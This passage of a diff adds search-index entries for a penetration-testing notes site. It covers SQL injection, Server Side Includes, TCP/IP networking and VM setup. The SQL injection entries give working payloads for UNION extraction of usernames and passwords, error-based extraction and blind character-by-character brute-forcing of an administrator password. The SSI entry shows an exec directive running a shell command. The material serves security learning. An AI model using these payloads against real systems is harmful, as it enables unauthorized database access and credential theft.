+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html"
+  },"56": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Detecting SQL Injection Vulnerabilities",
+    "content": "Web scanner tools can be used for this purpose for quick and efficient detection but these can also be detected manually. This manual process consists of a systematic set of tests against every entry point in the application, these typically involve: . | Submitting single quote character ' and looking for errors or anomalies | Submitting SQL-specific syntax an observable chance could be evaluated | Submitting Boolean conditions and looking for differences OR 1=1 and OR 1=2 | Submitting payloads designed to trigger time delays when executed and observing response times | Performing OAST methods to trigger an out-of-band network interaction when executed within a SQL query | . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#detecting-sql-injection-vulnerabilities",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#detecting-sql-injection-vulnerabilities"
+  },"57": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "SQL Injection in Different Parts of the Query",
+    "content": "Generally, most SQLi vulnerabilities arise within the WHERE clause of a SELECT query. However, SQLi vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations are: . | In UPDATE statements, within the updated values or the WHERE clause. | In INSERT statements, within the inserted values. | In SELECT statements, within the table or column name. | In SELECT statements, within the ORDER BY clause. | . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#sql-injection-in-different-parts-of-the-query",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#sql-injection-in-different-parts-of-the-query"
+  },"58": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "SQL Injection Type Examples",
+    "content": "There are many SQLi vulnerabilities, attacks, and techniques, which all arise in different situations. Some more common ones include: . | Retrieving hidden data, where you modify a SQL query to return additional results. | Subverting application logic, where you can change a query to interfere with the application’s logic. | UNION attacks, where you can retrieve data from different database tables. | Blind SQL injection, where the results of a query you control are not returned in the application’s responses. | . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#sql-injection-type-examples",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#sql-injection-type-examples"
+  },"59": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Basic SQL Statement",
+    "content": "A large amount of SQL statements on something like a product search page will be structured similarly too: . SELECT * FROM {some-table(s)} WHERE {some-field} = '{some-query}' SELECT * FROM products WHERE categories = 'Gifts' AND released = 1 . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#basic-sql-statement",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#basic-sql-statement"
+  },"60": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Handling Different SQL System Syntax",
+    "content": "There is a variety of SQL platforms available now and each use slightly different SQL syntax to carry out operations. A useful cheatsheet can be found on the PortSwigger SQL Injection Cheat Sheet here that details the different syntax for each main platform. There is also a fairly comprehensive cheat sheet here for different systems. ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#handling-different-sql-system-syntax",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#handling-different-sql-system-syntax"
+  },"61": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Basic Evaluate True (Return All)",
+    "content": "A very basic way to exploit a statement like the above would be to break out of the quotes and then add a statement that always evaluates as true and comment out the final section of the statement. Adding a simple ' OR 1=1--, escapes the categories field value by ending the quotes, adds an OR statement followed by a statement that always evaluates as True. Finally we use a -- to comment out any other statements following in the query. SELECT * FROM products WHERE categories = '' OR 1=1-- ' AND released = 1 . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#basic-evaluate-true-return-all",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#basic-evaluate-true-return-all"
+  },"62": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Determining the number of columns in a table",
+    "content": "Finding out the number of columns in a table can be very useful for construction a UNION attack as to UNION another table to the result you need to match the number of columns. This means before we can create this attack we need to determine how many columns are in the current table. To do this we can use the ORDER BY command to determine how many columns are in the table. By escaping a parameter and then adding an ORDER BY 1-- you can control the order of the results by sorting based on the column index specified. This means that you can increase the number until you get a server error (indicating that you have tried to select a column index out of range) allowing you to determine the number of columns in a table. ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- etc . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#determining-the-number-of-columns-in-a-table",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#determining-the-number-of-columns-in-a-table"
+  },"63": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "UNION Attacks",
+    "content": "UNION Attacks are where you use a UNION command to attach a secondary/multiple more statements to the end of an SQL command to retrieve information from another table or different columns. Some key requirements for a UNION attack is that the number of columns that are being appended to the bottom of the original result have to match. You can determine the number of columns of a table using a method described in Determining the number of columns in a table . More information can also be found on the PortSwigger UNION Attacks page. Append a blank table to the end of the list with NULL values . ' UNION SELECT NULL,NULL,NULL-- . Finding columns that have a useful data type . ' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'-- . Retrieving information from another table . | For this you must make sure that you follow the appropriate number of columns needed for the UNION to work | This also requires you to know the column names and table name for the data you wish to access | . ' UNION SELECT username, password FROM users-- . Retrieving multiple values within a single column . | If you wish to return data that is more columns that the original query you can concatinate the data from the extracted table into a single column | This could also be required if you only have limited columns that support the data type you require | . ' UNION SELECT username || '-' || password FROM users-- ' UNION SELECT NULL,username || '-' || password FROM users-- . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#union-attacks",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#union-attacks"
+  },"64": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Error Based Extraction",
+    "content": ". | If an application simply just returns an error to the user, data could possibly be extracted. A simple workflow could go as follows: Oracle Based: . | Try a simple error (this proves we can run SQL but fails because it wants a bool) | . | . ' AND CAST((SELECT 1) AS int)-- . | Make it a bool condition (the error will no go away) | . ' AND 1=CAST((SELECT 1) AS int)-- . | Extract information (this will fail as it tries to convert string to int, logging the string in the error) | . ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#error-based-extraction",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#error-based-extraction"
+  },"65": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Discovering System Information",
+    "content": ". | There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used | These are specific to the languag but can be very helpful for recon on the target | . -- Oracle: SELECT banner FROM v$version SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’ SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’ SELECT version FROM v$instance . The queries to determine the database version for some popular database types are as follows: . |   |   | . | Database type | Query | . | Microsoft, MySQL | SELECT @@version | . | Oracle | SELECT * FROM v$version | . | PostgreSQL | SELECT version() | . For most database types (notably excluding Oracle) a set of views called the Information schema can provide database information: . SELECT * FROM information_schema.tables . This will return something like this: . | TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE | . | MyDatabase | dbo | Products | BASE TABLE | . | MyDatabase | dbo | Users | BASE TABLE | . | OtherDatabase | public | Feedback | BASE TABLE | . Finding columns is simple after this: . SELECT * FROM information_schema.columns WHERE table_name = 'Users' . Equivalent information for Oracle: . SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'Users' . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#discovering-system-information",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#discovering-system-information"
+  },"66": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Blind SQL Injection Vulnerabilities",
+    "content": "A blind SQL injection is where the application doesn’t return the results of the query or the details of any database errors within its response. These vulnerabilities can still be exploited to access unauthorized data, however, techniques are generally more complicated and difficult to perform. Depending on the nature of the vulnerability, the following techniques can be used to exploit blind SQLi vulnerabilities: . | You can change the logic of the query to trigger a detectable difference in the application’s response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero. | You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the response time. | You can trigger an out-of-band network interaction, using OAST techniques. Often you can directly exfiltrate data via the out-of-band channel eg. placing the data into a DNS lookup for a domain you control. | . It is important to ensure that the injection is being treated as SQL and not something else, an easy way to do this is my trying to execute a simple SQL syntax (like string concatenation) and something the produced the opposite: . Oracle: a' || (SELECT '' FROM dual) || ' a' || (SELECT '' FROM table-doesnt-exist) || ' . You can test a single boolean condition and trigger a database error if the condition is true. |   |   | . | Oracle | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual | . | Microsoft | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END | . | PostgreSQL | 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END) | . | MySQL | SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') | . This can then be expanded such as: . SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' . You can determine if a table exists by searching for the first row in a table: . SELECT '' FROM users WHERE ROWNUM = 1 . A nice way to determine the length of a field could be by iterating over a condition of its length: . ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a' . For cracking the value you can repeat a similar technique by testing each letter one by 1: . ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b' ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c' ... ' AND (SELECT SUBSTRING(password,15,1) FROM users WHERE username='administrator')='a' ' AND (SELECT SUBSTRING(password,16,1) FROM users WHERE username='administrator')='a' . This can then be automated in a simple script to determine the length and then crack the password (could even create a thread for each character and speed it up) or use a system like Burp Intruder for more basic automation . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#blind-sql-injection-vulnerabilities",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#blind-sql-injection-vulnerabilities"
+  },"67": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "Second-order SQL Injection",
+    "content": "First-order SQL injection is where an application takes user input from an HTTP request and incorporates the input into an SQL query in an unsafe way. Second-order injections (also known as stored SQL injection), is where the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way. Second-order SQL injection often arises when developers are aware of SQL injection vulnerabilities, so they safely handle the initial placement of input into the database. However, later when processing the data, which has been deemed to be safe, it is handled in an unsafe way, because the developer wrongly deems it to be trusted. ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#second-order-sql-injection",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#second-order-sql-injection"
+  },"68": {
+    "doc": "SQL Injection",
+    "title": "SQL Injection",
+    "content": " ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Index.html",
+    "relUrl": "/Attacks/sql-injection/SQL%20Injection%20Index.html"
+  },"69": {
+    "doc": "Screenshotting",
+    "title": "Documenting via Screenshots",
+    "content": "Screenshots serve as a momentary record and represent proof of results obtained, necessary for the Proof-Of-Concept and our documentation. One of the best tools for this is Flameshot. It has all the essential functions that we need to quickly edit our screenshots without using an additional editing program. We can install it using our APT package manager or via download from Github. Sometimes, however, we cannot show all the necessary steps in one or more screenshots. We can use an application called Peek and create GIFs that record all the required actions for us. ",
+    "url": "/pen-test-docs/setting-up/Screenshotting.html#documenting-via-screenshots",
+    "relUrl": "/setting-up/Screenshotting.html#documenting-via-screenshots"
+  },"70": {
+    "doc": "Screenshotting",
+    "title": "Screenshotting",
+    "content": " ",
+    "url": "/pen-test-docs/setting-up/Screenshotting.html",
+    "relUrl": "/setting-up/Screenshotting.html"
+  },"71": {
+    "doc": "Server Side Includes (SSI Framework) (.shtml)",
+    "title": "Server Side Includes (SSI Framework) (.shtml)",
+    "content": ". | Supported on: | Uses the folloing extensions (by default): | Directives . | Common | . | . SSI is a simple interpreted server-side scripting language. Most useful for including the contents of one or more files into a webpage on a webser, using its #includes directive. Supported on: . | Apache | LiteSpeed | nginx | IIS | W3C’s Jigsaw | . Uses the folloing extensions (by default): . | .shtml | .stm | .shtm | . Follows a simple syntax of: . &lt;!--#directive paramter=value parameter=value --&gt; Example: &lt;!--#include virtual=\"../quote.txt\" --&gt; . ",
+    "url": "/pen-test-docs/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html",
+    "relUrl": "/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html"
+  },"72": {
+    "doc": "Server Side Includes (SSI Framework) (.shtml)",
+    "title": "Directives",
+    "content": "Common . | Directive | Parameters | Description | Example | . | include | file or virtual | Include another document in this one; virtual handles any path as if part of the url; file handles any path as if part of the underlying filesystem; file cannot use absolute paths or ../; virtual is recommended over file | &lt;!--#include virtual=\"menu.cgi\" --&gt; | . | exec | cgi or cmd | Executes a program, script, or shell command; cmd specifies a server-side command; cgi specifies a path to a CGI script | &lt;!--#exec cmd=\"ls -la\" --&gt; | . | echo | var | Displays the contents of a HTTP env var | &lt;!--#echo var=\"REMOTE_ADDR\" --&gt; | . | config | timefmt, sizefmt, or errmsg | Configures the display formats for the date, time, filesize, and error message (returned when an SSI command fails) | &lt;!--#config timefmt=\"%y %m %d\" --&gt; | . | flast mod and fsize | file or virtual | Displays date when the specified file was last modified or its size | &lt;!--#flastmod virtual=\"index.html\" --&gt; | . ",
+    "url": "/pen-test-docs/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html#directives",
+    "relUrl": "/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html#directives"
+  },"73": {
+    "doc": "TCP/IP Framework",
+    "title": "TCP/IP Framework",
+    "content": ". | OSI Model Simply Explained | TCP/IP Model Simply Explained . | TCP vs UDP | . | Packet Inspection . | Stateless Inspection . | What is inspected? | Use Cases | . | Stateful Inspection . | Sessions | . | Using both Stateful &amp; Stateless together | . | IDS vs IPS Systems . | IDS - Intrusion Detection System | IPS - Intrusion Prevention System | IPS Defences | Detection Methods . | Anomaly-Based | Signatures | Host-Based IDS (H-IDS) | Network-Based | . | Firewall Filters | . | Network Address Translation (NAT) . | Types of NAT | . | Local Area Networks . | Network Addressing | Ethernet Networks . | MAC Addresses | Communication Methods | . | Network Devices on a LAN | Virtual LANs | Address Resolution Protocol (ARP) | Routing Tables | . | . OSI MODEL TCP/IP Layers +---+-------------+ +---+-------------+ | 7 | Application | - | ~~~~~~~~~~~ | 6 | Presentation| 4 | Application | 5 | Session | - | ~~~~~~~~~~~ | 4 | Transport | &lt;--&gt; | 3 | Transport | 3 | Network | &lt;--&gt; | 2 | Network | 2 | Data Link | &lt;--&gt; | - | -Network- | 1 | Physical | &lt;--&gt; | 1 | Interface | +---+-------------+ +---+-------------+ . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html"
+  },"74": {
+    "doc": "TCP/IP Framework",
+    "title": "OSI Model Simply Explained",
+    "content": ". | Layer 1: Physical Layer - Responsible for the physical transportation of data as 0’s &amp; 1’s. | Layer 2: Data Link Layer - Responsible for routing packets using MAC addresses. | Layer 3: Network Layer - Responsible for routing packets using IP addresses. | Layer 4: Transport Layer - Handles the protocol used for transport of the packet, controls what happens if a packet does make it for example. | Layer 5: Session Layer - Handles starting, closing and managing sesisons. Session auth etc is established here. | Layer 6: Presentation Layer - Converts the data into formats usable by the application. | Layer 7: Application Layer - This is the actual application and it decides how it then displays the information. | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html#osi-model-simply-explained",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html#osi-model-simply-explained"
+  },"75": {
+    "doc": "TCP/IP Framework",
+    "title": "TCP/IP Model Simply Explained",
+    "content": ". | Layer 1: Network Access Layer - This layer sends and recieves the data at the local network level. | Layer 2: Internet Layer - This is where IP addresses and routing occurs. | Layer 3: Transport Layer - TCP &amp; UDP Protocols occur here. | Layer 4: Application Layer - This layer handles sessions, translating data, and the interaction of the content at the application level, eg. HTTP, FTP, or SMTP. | . TCP vs UDP . | TCP is a connection-oriented protocol, a much more rigorus acknowledgement between a sender and a receiver happens before any data is sent. This protocol includes flow control and error recovery, and should be used when important or large amounts of data is needed to be sent with timing being less of a concern. | UDP is a much more lightweight protocol that doesn’t require a fixed channel between the parties. It is often for less important data that just needs to be sent quickly. | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html#tcpip-model-simply-explained",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html#tcpip-model-simply-explained"
+  },"76": {
+    "doc": "TCP/IP Framework",
+    "title": "Packet Inspection",
+    "content": "Stateless Inspection . | Each packet is inspected one at a time, independently of any other packet knowledge | No session tables are maintained, no database of previous packets inspected | Much faster than stateful inspection, no need to check databases | . What is inspected? . | Source IP address . | Access Control List rule determins if an IP is allowed into the network or if dst IP is allowed to be accessed | . | Destination port / service | . Use Cases . | To protect routing engine resources | To control traffic going in or out your network | For troubleshooting purposes when classifying packets | To control traffic routing (through the use of routing instances) | To perform QoS/CoS (marking traffic priorities) | . Stateful Inspection . | Each packet is inspected with knowledge of all the previous packets in that session | . Sessions . | A session contains all the packets exchanged between the parties in an exchange | Contains: . | Src IP &amp; Port | Dst IP &amp; Port | [Optional] Instance Identifyer | . | A session ID can be used to locate the session information from the firewall packet database | . $ show security flow session application telnet Session ID: 57866, Policy name: intrazone-Juniper-SV/4, Timeout: 3394, Valid In: 172.20.107.10:56290 --&gt; 172.20.207.10:23;tcp, If: vlan.107, Pkts: 27, Bytes: 1568 Out: 172.20.207.10.23 --&gt; 172.20.107.10:56290;tcp, If: lt-0/0/0.1, Pkts: 21, Bytes: 1543 . Using both Stateful &amp; Stateless together . | Stateless inspection is performed first | Then Stateful data is evaluated | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html#packet-inspection",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html#packet-inspection"
+  },"77": {
+    "doc": "TCP/IP Framework",
+    "title": "IDS vs IPS Systems",
+    "content": "IDS - Intrusion Detection System . | Network security technology originally built for detecting vulnerability exploits against a target application or computer. | Listen-only device | Most often, the IDS is a dedicated server that is connected to a port on a switch. | The switch forwards a copy of all traffic to the IDS for inspection | Monitors traffic (looking for anomolus behaviour) and then notifies an administrator | Cannot automatically take action to prevent a detected exploit from taking over the system Some modern IDS’ can run scripts, eg. that send a command to block an IP address to the router . | . IPS - Intrusion Prevention System . | Network security/threat prevention technology that examines network traffic to detect and prevent vulnerability exploits. | IPS sits inline in a network, meaning all traffic MUST pass through it first before it can then move on (this adds a delay to the traffic) | Positioned right after an edge device, router or firewall (Some firewalls are designed to act like an IPS) | Unlike an IDS, the IPS actively analyzes packets, taking automated actions on all traffic flows that enter the network | IPS | IDS |-|-|-| Placement in the network infrastructure | Part of the direct line of communication (inline) | Outside direct line of communication (offline) | System Type | Active (monitors and automatically defends) and/or passive | Passive (monitors and notifies) | Detection mechanism | Statistical anomaly-based detection; Signature detection: Explit-facing signature, Vulnerability-facing signature | Anomaly based | . IPS Defences . | Can automatically create an ACL to block traffic that has been identified as malicious | In passive mode, it will just notify the admin | . Detection Methods . Anomaly-Based . | Detect if a protocol’s standards are not being followed | eg. Lots of half opened TCP sessions, HTTP arrives with an unexpectedly long header or missing headers | . Signatures . | Contain a database of signatures that are malicious | Patterns that can be found in the payload of traffic | . Host-Based IDS (H-IDS) . | Software based solutions installed on a host to defend it from attack | Listens to the traffic being recieved by or sent from the endpoint, and takes action/alerts where needed | . Network-Based . | Hardware based | IDS - sits on the side and recieved a copy of the traffic | IPS - sits on the line and actively analyses traffic | . Firewall Filters . | Many modern firewall designs have a Control Plane and a Forwarding Plane | The Forwarding Plane is responsible for all routing decisions, forwarding the packets on, policy evaluations, session matching etc | The Control Plane runs the device operating system and holds the routing table, if this plane becomes unavailable the device can still forward traffic as the Plane’s are seperate | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html#ids-vs-ips-systems",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html#ids-vs-ips-systems"
+  },"78": {
+    "doc": "TCP/IP Framework",
+    "title": "Network Address Translation (NAT)",
+    "content": ". | Translates an IP address on a network to another IP address to be used on a different network ( eg. internal IP (private host IP) –&gt; external IP (router IP for internet) ) | Router will read the Layer 3 information, and if there is any NAT procedure, it will modify the Src or Dst IP address | Provides an additional layer of security, by preventing the real IP addresses of the systems on a network from being exposed across the internet | Allows a network to expose a public IP address for each system OR just expose a single firewall IP address for the entire network | . Types of NAT . | Static address translation (Static NAT) : Allows for one-to-one mapping between local and global addresses. | Dynamic address translation (Dynamic NAT) : Maps unregistered IP addresses to registered IP addresses from a pool of registered IP addresses. | Overloading : Maps multiple unregistered IP addresses to a single registered address (many to one) using different ports (information is added in the Layer 4 data). This method is also known as Port Address Translation (PAT). By using overloading, thousands of users can be connected to the Internet by using only one real global IP address. Also requires the network to keep a database of the mappings. | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html#network-address-translation-nat",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html#network-address-translation-nat"
+  },"79": {
+    "doc": "TCP/IP Framework",
+    "title": "Local Area Networks",
+    "content": "Network Addressing . | Layer 2 : Data Link Layer . | Uses MAC addresses | . | Layer 3 : Network Layer . | Uses IP addresses | . | . | Data is encapsulated within a packet header | Then the header is encapsulated within another header | IP packet is then encapsulated in a Layer 2 frame (eg. ethernet frame) | All encapsulated with physical information at Layer 1 | This is then reversed on the recieving end | . | Layer 2 Addresses | Layer 3 Addreses |-|-|-| Also known as | MAC Addresses; Hardware Addresses; Physical Addresses | IP Addresses; Logical Addresses | Example | 00:90:96:9f:ea:46 | 172.16.12.1 | Characteristics | Idenfity the stops made along the way; Change with each stop along the route | Identify the communicating computers or end points; Do not change (unless going through NAT) | . Everytime a packet enters a new Layer 3 device, the Layer 2 information is stripped out and replaced with new source and destination addreses . Ethernet Networks . Ethernet (IEEE 802.3) Frame Format: . | Preamble | SFD | Dst Addr | Src Addr | Length | Data | Checksum/CRC | . | 7 Bytes | 1 Byte | 6 Bytes | 6 Bytes | 2 Bytes | 46-1500 Bytes | 4 Bytes | . | Preamble - First 7 bytes of an Ethernet Frame, alternating between 0 and 1 allowing bit sync to happen and the reciever to lock onto the datastream before the actual frame bits start. | Start of frame delimiter (SFD) - 1-Byte field that is always set to 10101011. This indicates the next bits are the destination address. Warns stations this is the last chance to sync. The SFD is often described as part of the preamble, making it the first 8-bytes . | Dst Addr - Contains the MAC address of the machine it is destined. | Src Addr - MAC address of source machine. As Src Addr is always an individual address (Unicast), the least significant bit of first byte is always 0. | Length - Entire length of Ethernet frame, can be a 16-bit value between 0 and 65534. Data cannot be longer due to limitations of Ethernet. | Data - The Payload of the packet. Both IP header and data will be inserted here if Internet Protocol is used over Ethernet. Maximum length of 1500 bytes, and minimum of 46 bytes (0 padding will be added if data doesn’t meet minimum length) | Checksum/CRC (Cyclic Redundancy Check) - 32-bit hash code of the dst addr, src addr, length and data fields. | . Recieving a packet . | Layer 1 : Converts the signals to data and passes the frame to layer 2 | Layer 2 : Checks that the Dst MAC addr is the same as its own MAC addr, if so it strips off the layer 2 data and forwards the data as a packet to Layer 3 | Layer 3 : Checks that the Dst IP Addr is the same as its own, if so strips the L3 data and forwards to L4 . | If Dst MAC or Dst IP addr doesn’t match the systems own addr the packet will be discarded as its not intended for that system | . | . MAC Addresses . | 48-bit address that uniquly identifies every NIC. | First 3 bytes are for the OUI and last 3 bytes are reserved to identify each NIC. | . 00:90:69:9f:ea:46 example: . | 00:90:69 - Identifies the manafacturer; Organizationally Unique Identifier (OUI) | 9f:ea:46 - Identifies the unique NIC | . Communication Methods . | Unicast - 1-1 cast, only talking to one other device on a network . | Uses MAC &amp; IP of dst device | . | Broadcast - 1-All cast, sends a message to all devices on a network . | Uses Maximum MAC Value (FF:FF:FF:FF:FF:FF) and boardcast IP address (x.x.x.255 by default) | . | Multicast - 1-Many cast, sends a message to all specified devices on a network . | Devices can subscribe to an endpoint (a specific class-D range IP) | The MAC address always begins with 01-00-5E for multicast and the last 3 bytes are created by converting the lower 23 bits of the IP multicast group address into 6 hex characters. | . | Half-duplex - Unable to transmit and recieve at the same time, traffic can only flow in one direction at a time. | Full-duplex - Can transmit and recieve data at the same time, traffic and flow in either direction at the same time. | . Network Devices on a LAN . | Hub - Takes the input data from one port and broadcasts it to all other ports on the network | Amplifier - Amplifies the input signal, this also amplifies any noise | Repeater - Takes the input signal and regenerates it, eliminating any noise in the signal | Bridge - Only sends the signal to the port the dst computer is connected too, it contains a MAC table so it knows where each device is in the network | Switch - Upgrade over the bridge, network loops are still an issue, they might not improve performance with multicast and broadcast traffic, cannot connect geographically dispersed networks | . | Bridge | Switch | . | Half-duplex data transmission | Full-duplex data transmission | . | End-user devices share bandwidth on each port | Each port is dedicated to a single device; bandwidth is not shared | . | Virtual LANs are not possible | Virtual LANs are possible | . Virtual LANs . | Logical seperation of devices in a network | Could have 5 devices connected to a switch but you could create a VLAN containing 2 of the devices | . Address Resolution Protocol (ARP) . | Used to find the MAC address of devices within the same broadcast domain | Simply maps an IP (L3) address to a MAC (L2) Address | Can be viewed using the following command | . arp -a ? (9.140.101.1) at 0:0:5e:0:1:1 on en0 ifscope [ethernet] ? (9.140.101.127) at 88:66:5a:4d:e2:f4 on en0 ifscope permanent [ethernet] ? (224.0.0.251) at 1:0:5e:0:0:fb on en0 ifscope permanent [ethernet] ? (239.255.255.250) at 1:0:5e:7f:ff:fa on en0 ifscope permanent [ethernet] . | Pings on the broadcast address to all devices on the network asking if they have the IP address being queried | The device with that address will respond with its MAC address | . Routing Tables . | If we don’t know anything about the address it is sent to the default gateway by default which then routes it on | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html#local-area-networks",
+    "relUrl": "/Knowledge/Networks/TCP-IP%20Framework.html#local-area-networks"
+  },"80": {
+    "doc": "Testing",
+    "title": "Testing",
+    "content": " ",
+    "url": "/pen-test-docs/Knowledge/Testing/Testing%20Index.html",
+    "relUrl": "/Knowledge/Testing/Testing%20Index.html"
+  },"81": {
+    "doc": "Tools",
+    "title": "Tools",
+    "content": " ",
+    "url": "/pen-test-docs/Knowledge/Tools/Tools%20Index.html",
+    "relUrl": "/Knowledge/Tools/Tools%20Index.html"
+  },"82": {
+    "doc": "Virtualization",
+    "title": "Virtualization",
+    "content": ". | Hardware Virtualization | Introduction to VirtualBox | Networking multiple VM’s together | . Virtualization is an abstraction of physical computing resources. Both hardware and software components can be abstracted. Virtualization involves the abstraction of physical computing resources such as hardware, software, storage, and network components . In virtualization, we distinguish between: . | Hardware virtualization | Application virtualization | Storage virtualization | Data virtualization | Network virtualization | . Hardware Virtualization . enable hardware components to be made available independently of their physical basis using hypervisor software. Best known example is the virtual machine (VM). Primary Benefits: . | Applications and services of a VM do not interfere with each other | Complete independence of the guest system from the host system’s operating system and the underlying physical hardware | VMs can be moved or cloned to other systems by simple copying | Hardware resources can be dynamically allocated via the hypervisor | Better and more efficient utilization of existing hardware resources | Shorter provisioning times for systems and applications | Simplified management of virtual systems | Higher availability of VMs due to independence from physical resources | . Introduction to VirtualBox . An excellent and free alternative to VMware Workstation is VirtualBox. With VirtualBox, hard disks are emulated in container files, called Virtual Disk Images (VDI). Aside from VDI format, VirtualBox can also handle hard disk files from VMware virtualization products (.vmdk), the Virtual Hard Disk format (.vhd), and others. We can also convert these external formats using the VBoxManager command-line tool that is part of VirtualBox. We can install VirtualBox from the command line or download the installation file from the official website and install it manually. Also, we have the possibility and function to encrypt the VM, which we should always use. Networking multiple VM’s together . Using VirtualBox multiple VM’s can be added to the same network without losing access to the internet. This can be done via the following steps to create a custom NAT Network: . | To go Tools &gt; Preferences &gt; Network | Create a new Network and give it a name &amp; IP | In the network settings for each VM select NAT Network as the adapter | Select the custom network name | Test the connections between the boxes using Ping or NMap | . ",
+    "url": "/pen-test-docs/setting-up/Virtualization.html",
+    "relUrl": "/setting-up/Virtualization.html"
+  },"83": {
+    "doc": "Web Application",
+    "title": "Web Application",
+    "content": " ",
+    "url": "/pen-test-docs/Attacks/web-application/Web%20Application%20Index.html",
+    "relUrl": "/Attacks/web-application/Web%20Application%20Index.html"
+  },"84": {
+    "doc": "Wireless Network Security",
+    "title": "Wireless Network Security",
+    "content": ". | Network Segmentation | Access Point Placement | Encryption | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html",
+    "relUrl": "/Knowledge/Networks/Wireless%20Network%20Security.html"
+  },"85": {
